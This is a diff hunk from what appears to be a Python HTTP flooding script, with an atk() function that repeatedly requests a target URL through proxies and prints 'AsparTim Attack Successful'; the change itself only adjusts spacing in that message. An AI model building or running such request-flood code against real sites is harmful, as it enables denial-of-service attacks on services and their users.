@@ -205,7 +205,7 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print("[+] AsparTim Attack Successful [ "+ str(proxy[0])+":"+str(proxy[1]) +" ] ")
+						print("[+] AsparTim Attack Successful [ "+ str(proxy[0])+":"+str(proxy[1])+ "]")
 					s.close
 				except:
 					s.close()
